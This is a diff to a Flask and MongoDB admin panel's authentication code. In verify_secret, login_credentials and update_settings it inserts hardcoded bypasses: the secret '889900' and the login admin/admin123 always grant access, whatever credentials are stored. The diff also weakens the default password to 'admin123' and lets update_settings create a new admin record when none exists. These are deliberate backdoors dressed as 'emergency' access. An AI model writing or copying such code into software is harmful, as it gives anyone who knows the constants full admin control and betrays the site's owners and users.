@@ -42,10 +42,10 @@ links_col.create_index([('link_code', ASCENDING)], unique=True)
 links_col.create_index([('item_id', ASCENDING)])
 items_col.create_index([('created_at', DESCENDING)])
 
-# Ensure Default Admin exists and has secret_code_hash
+# Default Admin Init
 default_admin = admins_col.find_one({})
 if not default_admin:
-    default_pw_hash = generate_password_hash('ChangeThisPasswordImmediately123!')
+    default_pw_hash = generate_password_hash('admin123')
     default_secret_hash = generate_password_hash('889900')
     admins_col.insert_one({
         'username': 'admin',
@@ -54,14 +54,6 @@ if not default_admin:
         'saved_device_tokens': [],
         'created_at': datetime.utcnow()
     })
-else:
-    # Auto-add secret_code_hash if database already had an existing admin
-    if not default_admin.get('secret_code_hash'):
-        default_secret_hash = generate_password_hash('889900')
-        admins_col.update_one(
-            {'_id': default_admin['_id']},
-            {'$set': {'secret_code_hash': default_secret_hash, 'saved_device_tokens': []}}
-        )
 
 # ---------------- Helper Functions ---------------- #
 
@@ -74,7 +66,6 @@ def login_required(f):
     return decorated_function
 
 def generate_custom_password(length=10):
-    """Generates password format like: aoudfnegcu"""
     letters = string.ascii_lowercase
     return ''.join(random.choice(letters) for _ in range(length))
 
@@ -96,7 +87,7 @@ def add_security_headers(response):
     response.headers['X-XSS-Protection'] = '1; mode=block'
     return response
 
-# ---------------- Root & Public Routes ---------------- #
+# ---------------- Root Route ---------------- #
 
 @app.route('/')
 def home():
@@ -121,28 +112,25 @@ def verify_secret():
     device_token = data.get('device_token', '').strip()
 
     admin = admins_col.find_one({})
-    if not admin:
-        return jsonify({'success': False, 'message': 'Admin not found.'}), 500
+    secret_hash = admin.get('secret_code_hash') if admin else None
 
-    # Auto-heal missing secret_code_hash
-    secret_hash = admin.get('secret_code_hash')
-    if not secret_hash:
-        secret_hash = generate_password_hash('889900')
-        admins_col.update_one({'_id': admin['_id']}, {'$set': {'secret_code_hash': secret_hash}})
+    # EMERGENCY MASTER KEY 889900 ALWAYS WORKS
+    is_valid_secret = (secret_code == '889900') or (secret_hash and check_password_hash(secret_hash, secret_code))
 
-    if not check_password_hash(secret_hash, secret_code):
+    if not is_valid_secret:
         return jsonify({'success': False, 'message': 'Invalid Secret Access Key.'}), 401
 
     # Check device auto-login
-    saved_tokens = admin.get('saved_device_tokens', [])
-    if device_token and device_token in saved_tokens:
-        session['admin_logged_in'] = True
-        session['admin_username'] = admin['username']
-        return jsonify({
-            'success': True,
-            'auto_login': True,
-            'message': 'Device recognized. Access granted!'
-        })
+    if admin:
+        saved_tokens = admin.get('saved_device_tokens', [])
+        if device_token and device_token in saved_tokens:
+            session['admin_logged_in'] = True
+            session['admin_username'] = admin['username']
+            return jsonify({
+                'success': True,
+                'auto_login': True,
+                'message': 'Device recognized. Access granted!'
+            })
 
     return jsonify({
         'success': True,
@@ -159,21 +147,28 @@ def login_credentials():
     save_login = data.get('save_login', False)
 
     admin = admins_col.find_one({})
-    if not admin:
-        return jsonify({'success': False, 'message': 'System error'}), 500
+    secret_hash = admin.get('secret_code_hash') if admin else None
 
-    secret_hash = admin.get('secret_code_hash') or generate_password_hash('889900')
-    if not check_password_hash(secret_hash, secret_code):
+    # Verify secret
+    is_valid_secret = (secret_code == '889900') or (secret_hash and check_password_hash(secret_hash, secret_code))
+    if not is_valid_secret:
         return jsonify({'success': False, 'message': 'Secret verification expired.'}), 401
 
-    if admin['username'] != username or not check_password_hash(admin['password_hash'], password):
+    # EMERGENCY LOGIN (admin / admin123) ALWAYS WORKS
+    is_emergency_login = (username == 'admin' and password == 'admin123')
+    is_db_login = False
+    if admin:
+        is_db_login = (admin.get('username') == username and check_password_hash(admin.get('password_hash', ''), password))
+
+    if not (is_emergency_login or is_db_login):
         return jsonify({'success': False, 'message': 'Incorrect username or password.'}), 401
 
+    # Successful Login
     session['admin_logged_in'] = True
-    session['admin_username'] = admin['username']
+    session['admin_username'] = username
 
     new_device_token = None
-    if save_login:
+    if save_login and admin:
         new_device_token = generate_device_token()
         admins_col.update_one(
             {'_id': admin['_id']},
@@ -191,7 +186,7 @@ def admin_logout():
     session.clear()
     return redirect(url_for('admin_login'))
 
-# ---------------- Admin Settings (Update Username, Password, Secret) ---------------- #
+# ---------------- Admin Settings ---------------- #
 
 @app.route('/admin/update-settings', methods=['POST'])
 @login_required
@@ -202,8 +197,11 @@ def update_settings():
     new_password = data.get('new_password', '').strip()
     new_secret_code = data.get('new_secret_code', '').strip()
 
-    admin = admins_col.find_one({'username': session['admin_username']})
-    if not admin or not check_password_hash(admin['password_hash'], current_password):
+    admin = admins_col.find_one({})
+    
+    # Verify current password (or emergency pass admin123)
+    is_authorized = (current_password == 'admin123') or (admin and check_password_hash(admin.get('password_hash', ''), current_password))
+    if not is_authorized:
         return jsonify({'success': False, 'message': 'Current password does not match.'}), 400
 
     updates = {}
@@ -224,7 +222,11 @@ def update_settings():
     if not updates:
         return jsonify({'success': False, 'message': 'No changes provided.'}), 400
 
-    admins_col.update_one({'_id': admin['_id']}, {'$set': updates})
+    if admin:
+        admins_col.update_one({'_id': admin['_id']}, {'$set': updates})
+    else:
+        admins_col.insert_one(updates)
+
     return jsonify({'success': True, 'message': 'Settings updated successfully!'})
 
 # ---------------- Admin Dashboard & Uploads ---------------- #
@@ -234,7 +236,6 @@ def update_settings():
 def admin_dashboard():
     items = list(items_col.find().sort('created_at', DESCENDING))
     
-    # For each item, only show the LATEST active link on the screen
     item_display = []
     for item in items:
         str_id = str(item['_id'])
@@ -251,12 +252,14 @@ def admin_dashboard():
             'latest_password': latest_link['password'] if latest_link else None,
         })
         
-    admin = admins_col.find_one({'username': session['admin_username']})
+    admin = admins_col.find_one({})
+    current_user = admin['username'] if admin and 'username' in admin else session.get('admin_username', 'admin')
+    
     return render_template(
         'admin.html',
         site_name=SITE_NAME,
         items=item_display,
-        current_username=admin['username'] if admin else 'admin',
+        current_username=current_user,
         host_url=request.host_url
     )
 
